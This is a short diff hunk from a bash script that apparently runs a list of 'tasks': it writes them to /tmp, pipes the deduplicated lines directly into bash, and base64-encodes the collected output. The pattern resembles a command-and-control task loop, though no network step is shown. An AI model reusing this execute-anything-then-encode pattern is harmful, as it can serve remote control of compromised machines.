@@ -24,7 +24,7 @@ do
 	do
 		printf '%s\n' "$line" >> /tmp/tmp
 	done <<< $splittasks
-	sort /tmp/tmp|uniq -u > /tmp/tmps
+	cat /tmp/tmp|uniq -u > /tmp/tmps
 
     cat /tmp/tmps|bash >> /tmp/result
     base64 /tmp/result > /tmp/enc-result 
